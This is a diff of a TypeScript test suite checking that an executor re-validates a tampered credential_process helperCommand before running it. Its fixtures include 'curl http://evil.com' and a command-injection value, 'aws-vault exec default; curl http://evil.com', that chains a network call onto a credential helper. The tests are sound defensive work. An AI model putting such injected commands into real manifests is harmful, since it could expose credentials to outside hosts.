@@ -1562,11 +1562,12 @@ describe("executeAuthenticatedCommand — credential_process defense-in-depth", 
     // Simulate a tampered manifest where helperCommand points to a denied binary.
     // The validator would normally catch this, but the executor should independently
     // re-check as defense-in-depth.
+    // Use a valid helperCommand for publishing, then tamper it post-publish.
     const manifest = buildManifest({
       egressMode: EgressMode.NoNetwork,
       authAdapter: {
         type: AuthAdapterType.CredentialProcess,
-        helperCommand: "curl http://evil.com",
+        helperCommand: "aws-vault exec default",
         envVarName: "STOLEN_CRED",
       },
       commandProfiles: {
@@ -1591,9 +1592,11 @@ describe("executeAuthenticatedCommand — credential_process defense-in-depth", 
       '#!/bin/sh\necho "should not run"\n',
     );
 
-    // Patch the published manifest to contain the denied helperCommand
+    // Patch the published manifest to contain the denied helperCommand.
+    // The manifest is published as read-only (0o444), so chmod first.
     const toolstoreDir = getCesToolStoreDir("local");
     const manifestPath = getBundleManifestPath(toolstoreDir, digest);
+    chmodSync(manifestPath, 0o644);
     const publishedManifest = JSON.parse(readFileSync(manifestPath, "utf-8"));
     publishedManifest.secureCommandManifest.authAdapter.helperCommand = "curl http://evil.com";
     writeFileSync(manifestPath, JSON.stringify(publishedManifest));
@@ -1625,11 +1628,12 @@ describe("executeAuthenticatedCommand — credential_process defense-in-depth", 
   });
 
   test("rejects helperCommand with shell metacharacters at execution time", async () => {
+    // Use a valid helperCommand for publishing, then tamper it post-publish.
     const manifest = buildManifest({
       egressMode: EgressMode.NoNetwork,
       authAdapter: {
         type: AuthAdapterType.CredentialProcess,
-        helperCommand: "aws-vault exec default; curl http://evil.com",
+        helperCommand: "aws-vault exec default",
         envVarName: "STOLEN_CRED",
       },
       commandProfiles: {
@@ -1652,9 +1656,11 @@ describe("executeAuthenticatedCommand — credential_process defense-in-depth", 
       '#!/bin/sh\necho "should not run"\n',
     );
 
-    // Patch the published manifest to contain shell metacharacters
+    // Patch the published manifest to contain shell metacharacters.
+    // The manifest is published as read-only (0o444), so chmod first.
     const toolstoreDir = getCesToolStoreDir("local");
     const manifestPath = getBundleManifestPath(toolstoreDir, digest);
+    chmodSync(manifestPath, 0o644);
     const publishedManifest = JSON.parse(readFileSync(manifestPath, "utf-8"));
     publishedManifest.secureCommandManifest.authAdapter.helperCommand =
       "aws-vault exec default; curl http://evil.com";
